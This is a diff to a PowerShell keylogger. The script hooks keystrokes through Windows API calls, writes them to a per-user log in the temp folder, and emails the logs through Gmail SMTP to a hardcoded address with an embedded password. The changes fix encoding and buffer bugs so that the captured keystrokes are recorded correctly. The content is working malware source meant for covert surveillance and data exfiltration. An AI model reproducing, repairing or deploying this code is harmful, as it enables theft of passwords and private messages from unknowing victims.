@@ -5,12 +5,11 @@
 $email = "soleimaniyounes24@gmail.com"
 $password = "password"
 
-
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
   # email process
-  $logs = Get-Content "$logFile"
+  $logs = Get-Content "$logFile" -Encoding Unicode
   $subject = "$env:UserName logs"
   $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
   $smtp.EnableSSL = $true
@@ -55,12 +54,12 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           # create a stringbuilder
           $keyboardState = New-Object Byte[] 256
           $hideKeyboardState = $API::GetKeyboardState($keyboardState)
-          $loggedchar = New-Object -TypeName System.Text.StringBuilder
+          $loggedchar = New-Object -TypeName System.Text.StringBuilder -ArgumentList 256
 
           # translate virtual key
           if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
             # add logged key to file
-            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+            [System.IO.File]::AppendAllText($logFile, $loggedchar.ToString(), [System.Text.Encoding]::Unicode)
           }
         }
       }
